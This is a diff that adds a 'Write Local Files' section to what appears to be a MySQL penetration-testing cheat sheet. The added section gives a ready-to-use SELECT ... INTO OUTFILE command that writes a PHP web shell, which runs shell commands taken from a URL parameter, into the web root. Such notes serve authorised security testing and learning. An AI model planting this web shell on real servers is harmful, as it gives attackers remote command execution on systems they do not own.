@@ -56,6 +56,15 @@ show variables like "secure_file_prive";
 ```
 
 
+## Write Local Files
+
+- This creates a local file named `webshell.php` which can be used to create a web shell using the `PHP`. 
+
+```mysql
+mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+
+
 ## Read Local Files
 
 ```mysql
